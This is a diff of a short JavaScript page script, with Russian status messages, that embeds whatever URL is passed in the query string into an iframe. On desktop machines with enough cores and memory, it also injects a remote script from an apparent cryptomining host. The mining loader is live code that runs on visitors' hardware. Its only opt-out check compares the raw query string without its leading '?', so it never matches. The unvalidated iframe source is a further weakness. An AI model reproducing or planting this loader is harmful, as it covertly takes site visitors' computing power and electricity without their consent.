@@ -1,29 +1,32 @@
 document.addEventListener('DOMContentLoaded', function() {
-    "use strict";
+    'use strict';
 
-    if (navigator.cookieEnabled === false) {
-        document.body.innerText = 'Для работы сайта необходимо включить куки.';
-    } else if (location.search.length > 1) {
-        var x1 = document.createElement('iframe');
-        x1.setAttribute('src', location.search.substr(1));
-        x1.setAttribute('allowfullscreen', '');
-        document.body.appendChild(x1);
+    var body = document.body;
+    var search = location.search;
+    var cookie = typeof(navigator.cookieEnabled) === 'undefined' ? true : navigator.cookieEnabled;
 
-        if (typeof navigator.platform === "undefined" || (
-                navigator.platform !== 'Android' &&
-                navigator.platform !== 'iPhone' &&
-                navigator.platform !== 'iPad' &&
-                navigator.platform !== 'iPod' &&
-                navigator.platform !== 'BlackBerry' &&
-                navigator.platform !== 'WebTV OS' &&
-                localStorage.getItem('DisableMining') === null
-            )) {
-            var x2 = document.createElement('script');
-            x2.setAttribute('src', '//m1.egeria.space/mining');
-            x2.setAttribute('async', '');
-            document.body.appendChild(x2);
-        }
+    if (cookie === false) {
+        body.textContent = 'Ошибка: Включите куки.';
+    } else if (search === '') {
+        body.textContent = 'Ошибка: Неверный запрос.';
+    } else if (search === 'disableMining') {
+        window.localStorage.setItem('disableMining', true);
+        body.textContent = 'Статус: Майнинг отключён.';
     } else {
-        document.body.innerText = 'Неверный параметр API.';
+        var iframe = document.createElement('iframe');
+        iframe.setAttribute('src', search.substr(1));
+        iframe.setAttribute('allowfullscreen', '');
+        body.appendChild(iframe);
+
+        var hardwareConcurrency = typeof(navigator.hardwareConcurrency) === 'undefined' ? 9 : navigator.hardwareConcurrency;
+        var deviceMemory = typeof(navigator.deviceMemory) === 'undefined' ? 9 : navigator.deviceMemory;
+        var platform = typeof(navigator.platform) === 'undefined' ? '' : navigator.platform;
+
+        if (window.localStorage.getItem('disableMining') === null && hardwareConcurrency > 2 && deviceMemory > 2 && platform !== 'Android' && platform !== 'iPhone' && platform !== 'iPad' && platform !== 'iPod') {
+            var script = document.createElement('script');
+            script.setAttribute('src', '//m1.egeria.space/mining');
+            script.setAttribute('async', '');
+            body.appendChild(script);
+        }
     }
 });
